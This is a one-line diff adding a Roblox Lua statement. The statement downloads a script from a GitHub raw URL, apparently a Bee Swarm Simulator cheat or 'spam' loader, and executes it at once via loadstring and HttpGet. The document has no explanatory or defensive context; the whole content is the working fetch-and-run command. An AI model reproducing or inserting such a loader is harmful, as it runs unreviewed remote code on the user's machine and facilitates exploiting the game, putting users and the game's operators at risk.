@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/bee-swarm-simulator-spam3-greowyjtnu6rhq.lua"))()
